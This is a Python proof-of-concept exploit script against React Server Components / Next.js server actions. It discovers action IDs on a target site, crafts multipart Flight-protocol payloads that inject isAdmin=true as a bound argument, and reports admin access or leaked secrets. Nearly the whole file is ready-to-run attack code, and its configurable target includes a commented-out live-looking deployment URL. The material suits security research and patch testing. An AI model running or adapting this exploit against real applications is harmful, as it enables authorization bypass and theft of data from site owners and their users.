#!/usr/bin/env python3
"""
RSC Bound Argument Injection PoC
================================

This PoC demonstrates a vulnerability in React Server Components (RSC) where
an attacker can inject arbitrary bound arguments into server action calls.

The vulnerability exists in `loadServerReference` which uses:
  fn.bind.apply(fn, [null].concat(_ref))

Where `_ref` comes from user-controlled FormData via the RSC Flight protocol.

TARGET: adminAction(isAdmin: boolean, data: FormData)
  - Normally, isAdmin would be bound server-side based on authentication
  - Through RSC protocol manipulation, we inject isAdmin=true directly

AUTHOR: Security Research
DATE: 2024-12
"""

import requests
import json
import hashlib
import re
from urllib.parse import urljoin

# Configuration
TARGET_URL = "http://localhost:3000"  # Change to your target
# TARGET_URL = "https://nextjs-demo-app-indol.vercel.app"

def create_multipart_boundary():
    """Generate a multipart boundary."""
    return "----WebKitFormBoundary" + hashlib.md5(b"rsc-exploit").hexdigest()[:16]


def get_action_id(target_url):
    """
    Try to discover server action IDs from the page source.
    Action IDs are hashed identifiers in the format of hex strings.
    """
    print("[*] Fetching page to discover action IDs...")
    try:
        resp = requests.get(target_url, headers={
            "Accept": "text/html",
            "User-Agent": "Mozilla/5.0 RSC-PoC"
        }, timeout=10)
        
        # Look for action ID patterns in the response
        # Server action IDs are typically hex strings
        action_ids = re.findall(r'"([a-f0-9]{32,64})"', resp.text)
        
        if action_ids:
            print(f"[+] Found potential action IDs: {action_ids[:5]}")
            return action_ids
        else:
            print("[-] No action IDs found in page source")
            return []
    except Exception as e:
        print(f"[-] Error fetching page: {e}")
        return []


def craft_rsc_payload_method1(action_id, injected_bound_args):
    """
    Method 1: Direct $ACTION_ID_ with crafted RSC bound data.
    
    The payload uses the RSC Flight protocol format:
    - $ACTION_REF_<id>: Points to the action metadata
    - $ACTION_<id>:0: Contains the metadata JSON with 'id' and 'bound'
    - $ACTION_<id>:1: Contains the actual bound array
    """
    boundary = create_multipart_boundary()
    
    # The 'bound' field should be a reference to another chunk containing the array
    # We use "$@1" to reference chunk 1 which contains our injected arguments
    action_metadata = {
        "id": action_id,
        "bound": "$@1"  # Reference to chunk 1
    }
    
    # Chunk 1 contains our injected arguments array
    # The server will do: fn.bind.apply(fn, [null].concat(injected_args))
    bound_args_json = json.dumps(injected_bound_args)
    
    body_parts = [
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_REF_{action_id}"\r\n\r\n'
        f'$ACTION_{action_id}:\r\n',
        
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_{action_id}:0"\r\n\r\n'
        f'{json.dumps(action_metadata)}\r\n',
        
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_{action_id}:1"\r\n\r\n'
        f'{bound_args_json}\r\n',
        
        # Also include regular form data that the action expects
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="message"\r\n\r\n'
        f'Injected admin message!\r\n',
        
        f'--{boundary}--\r\n'
    ]
    
    return ''.join(body_parts), boundary


def craft_rsc_payload_method2(action_id, injected_bound_args):
    """
    Method 2: Using simplified $ACTION_ID_ format.
    
    This bypasses the bound mechanism by directly calling with $ACTION_ID_.
    """
    boundary = create_multipart_boundary()
    
    body_parts = [
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_ID_{action_id}"\r\n\r\n'
        f'\r\n',
        
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="message"\r\n\r\n'
        f'Test message\r\n',
        
        f'--{boundary}--\r\n'
    ]
    
    return ''.join(body_parts), boundary


def craft_rsc_payload_method3(action_id, injected_bound_args):
    """
    Method 3: Full RSC Flight protocol exploitation.
    
    We encode the bound arguments using the full RSC serialization format
    to maximize compatibility.
    """
    boundary = create_multipart_boundary()
    
    # RSC uses row-based format where each chunk is a separate entry
    # Format: $ACTION_<id>:<chunk_number>
    # Chunk 0: metadata with "id" and "bound" reference
    # The "bound" field uses "$@<n>" to reference another chunk
    
    # For [true] as bound args, we need to encode it properly
    # RSC format for true is just "true", array is [...]
    
    bound_array = json.dumps(injected_bound_args)  # [true] or [true, {...}]
    
    body_parts = [
        # Reference to the action
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_REF_{action_id}"\r\n\r\n'
        f'$ACTION_{action_id}:\r\n',
        
        # Chunk 0: Action metadata - bound is a direct value, not a reference
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="$ACTION_{action_id}:0"\r\n\r\n'
        f'{{"id":"{action_id}","bound":{bound_array}}}\r\n',
        
        # The actual form data
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="message"\r\n\r\n'
        f'EXPLOIT: Bound argument injection successful!\r\n',
        
        f'--{boundary}--\r\n'
    ]
    
    return ''.join(body_parts), boundary


def send_exploit(target_url, payload, boundary, action_id):
    """Send the crafted exploit payload."""
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "text/x-component",
        "Next-Action": action_id,
        "Next-Router-State-Tree": "[]",
        "RSC": "1",
        "User-Agent": "Mozilla/5.0 RSC-PoC"
    }
    
    try:
        resp = requests.post(
            target_url,
            data=payload.encode('utf-8'),
            headers=headers,
            timeout=30,
            allow_redirects=False
        )
        
        return resp
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return None


def test_normal_action(target_url, action_id):
    """Test a normal action call without exploitation."""
    print("\n[*] Testing NORMAL action call (no injection)...")
    
    boundary = create_multipart_boundary()
    payload = f"""--{boundary}\r
Content-Disposition: form-data; name="$ACTION_ID_{action_id}"\r
\r
\r
--{boundary}\r
Content-Disposition: form-data; name="message"\r
\r
Normal request\r
--{boundary}--\r
"""
    
    resp = send_exploit(target_url, payload, boundary, action_id)
    if resp:
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Response:\n{resp.text[:500]}...")
    return resp


def test_bound_injection(target_url, action_id):
    """Test bound argument injection attack."""
    print("\n[*] Testing BOUND ARGUMENT INJECTION attack...")
    print("[*] Injecting: isAdmin = true")
    
    # Inject isAdmin=true as the first bound argument
    injected_args = [True]  # This will become the first argument to adminAction
    
    payload, boundary = craft_rsc_payload_method3(action_id, injected_args)
    
    print(f"\n[DEBUG] Payload:\n{payload}\n")
    
    resp = send_exploit(target_url, payload, boundary, action_id)
    if resp:
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Headers: {dict(resp.headers)}")
        print(f"[+] Response:\n{resp.text}")
        
        # Check for success indicators
        if "success" in resp.text.lower() and "true" in resp.text.lower():
            print("\n" + "="*60)
            print("[!!!] VULNERABILITY CONFIRMED - ADMIN ACCESS GRANTED!")
            print("="*60)
        elif "admin" in resp.text.lower() and "secret" in resp.text.lower():
            print("\n" + "="*60)
            print("[!!!] VULNERABILITY CONFIRMED - SECRET DATA LEAKED!")
            print("="*60)
    
    return resp


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║    RSC Bound Argument Injection PoC                         ║
║    CVE: TBD - React Server Components Vulnerability          ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    target = TARGET_URL
    print(f"[*] Target: {target}")
    
    # Try to discover action IDs
    action_ids = get_action_id(target)
    
    # If we don't find action IDs automatically, you need to provide one
    # Action IDs are generated during build - check .next/server/app/ or network traffic
    if not action_ids:
        print("\n[!] Could not auto-discover action IDs.")
        print("[!] You may need to:")
        print("    1. Check browser DevTools Network tab for 'Next-Action' header")
        print("    2. Look in .next/server/server-reference-manifest.json")
        print("    3. Manually specify the action ID")
        
        # Placeholder - you need to replace with actual action ID
        manual_action_id = input("\n[?] Enter action ID (or press Enter to skip): ").strip()
        if manual_action_id:
            action_ids = [manual_action_id]
    
    if action_ids:
        # Test with the first discovered action ID
        action_id = action_ids[0]
        print(f"\n[*] Using action ID: {action_id}")
        
        # First test normal call
        test_normal_action(target, action_id)
        
        # Then test bound injection
        test_bound_injection(target, action_id)
    else:
        print("\n[-] No action IDs to test. Exiting.")


if __name__ == "__main__":
    main()
